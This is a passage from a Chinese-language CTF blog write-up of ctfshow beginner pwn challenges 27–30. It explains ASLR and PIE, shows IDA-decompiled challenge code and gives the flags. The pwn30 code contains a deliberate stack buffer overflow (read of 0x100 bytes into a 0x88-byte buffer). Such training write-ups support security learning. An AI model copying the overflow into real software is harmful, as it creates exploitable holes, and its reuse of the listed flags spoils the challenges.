<p><code>ctfshow&#123;0x400687_0x400560_0x603260_0x7ffff7fd64f0&#125;</code></p>
<h4 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// ST00_8</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// ST08_8</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// ST00_8</span>

  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">,</span> <span class="token number">258</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4008D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400950<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4009E0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A70<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400AF8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400B90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Please confirm your ASLR level first !                  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your ASLR level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If the result is 0 or 1, then you get the correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If not,you will get a fake flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is :ctfshow&#123;%p"</span><span class="token punctuation">,</span> main<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>改为0或1即可</p>
<p><code>ctfshow&#123;0x400687_0x400560_0x603260&#125;</code></p>
<h4 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h4><p>运行直接给flag<code>ctfshow&#123;0x400687_0x400560&#125;</code></p>
<h4 id="pwn29-PIE"><a href="#pwn29-PIE" class="headerlink" title="pwn29(PIE)"></a>pwn29(PIE)</h4><p><strong>PIE</strong>全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大<br>增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。</p>
<p><img src="pwn29_chjecksec.png" loading="lazy"></p>
<p>附件是64位elf，丢到IDA里，可以看到强制开启了ASLR的保护模式，之后用checksec命令输出附件的保护信息，最后直接给了flag的明文</p>
<h4 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h4><p>关闭PIE后  程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</p>
<p><img src="pwn30_checksec.png" loading="lazy"></p>
<p>IDA 32位 部分RELRO开启 </p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048710<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048784<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048800<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804888C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804891C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80489A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A34<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048AF8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : No Canary found &amp; No PIE "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>跟进ctfshow</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h]</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/" title="pwn入门-前置基础">https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/11/2024YLCTF/" rel="prev" title="2024YLCTF"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2024YLCTF</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/06/20240xGame/" rel="next" title="20240xGame"><span class="post-nav-text">20240xGame</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>